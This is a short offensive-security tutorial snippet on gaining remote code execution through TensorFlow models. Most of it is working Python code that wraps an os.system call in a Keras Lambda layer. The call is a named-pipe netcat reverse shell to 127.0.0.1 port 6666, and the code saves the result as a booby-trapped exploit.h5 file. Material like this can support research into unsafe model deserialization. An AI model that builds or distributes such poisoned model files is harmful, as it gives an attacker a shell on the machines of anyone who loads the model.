    Remote code execution

    TensorFlow models are programs which TensorFlow's runtime interprets adn executes, so we can take advantage of it by embedding malicious code.

    Lamda layer allows to wrap arbitrary python expresions as a Layer object which can interact with the rest of the model. The following code creates a reverse shell. More info Here

    import tensorflow as tf

    def exploit(x):
        import os
        os.system("rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc 127.0.0.1 6666 >/tmp/f")
        return x

    model = tf.keras.Sequential()
    model.add(tf.keras.layers.Input(shape=(64,)))
    model.add(tf.keras.layers.Lambda(exploit))
    model.compile()
    model.save("exploit.h5")
